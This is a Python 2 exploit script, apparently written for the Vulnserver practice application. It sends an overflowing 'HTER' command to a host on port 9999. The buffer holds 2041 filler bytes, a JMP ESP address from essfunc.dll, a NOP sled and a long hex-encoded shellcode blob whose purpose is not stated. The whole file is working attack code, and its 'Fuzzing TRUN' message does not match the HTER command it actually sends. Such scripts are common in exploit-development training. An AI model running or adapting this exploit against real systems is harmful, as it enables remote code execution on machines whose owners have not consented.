#!/usr/bin/python
import socket


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect(('192.168.101.158',9999))


# PAYLOAD LENGHT IS : 2809 with 2800 of A

buf = 'HTER '

buf += "A"*2041

# buf += "B"*8
# 625011AF JMP ESP

buf += "af115062"

buf += "90"*40

buf += "d9c3bd880e63ead97424f45e33c9b152316e17036e178366f2811f8ae3c4e072f4a86997c5e80edc76d945b07a92082008d68447b95df3663acdc7e9b80c14c981de6908c50383589e48364cab058be7e7888b14bfabba8bcbf51c2a1f8e14347cabefcfb647ee1987a85d64275b9fa18084eadbf239ed1888e578ba2a6dda66caa2bdedc00fc9a9c48e1ec2f11ba104705f8680d83ba79184ead8c166527d8a8b870cd1c3643de913e3369a21acec340a252bc36d1c8b5b909fec7257cbbcec7e7457ec7fa1f8bc2f1ab96c90ca51661f344189f55de8709ea1451e6c4a94de91311138fb55749394ccdd6f0410c80a069affebc96b75ffbe9bc05d68a3fec9f6366509702b325ed59d4b0acb84e5281650cde8cda1d0f1809ef6e15c1eb35531496d03f723dffda198896937d309ef383efc0f8897b93025704e495be0b180df4a88c87de3b599c36e46740797c57cf86cd5f5fd2951e68f22340823421d"

buf += "90"*(1951-40-351)

# buf += "B"*4
# 625011AF JMP ESP in essfunc.dll

#buf += "\xaf\x11\x50\x62"


print "Fuzzing TRUN with %s bytes" % len(buf)

print s.recv(1024)

s.send(buf + '\r\n')

print s.recv(1024)

s.close()
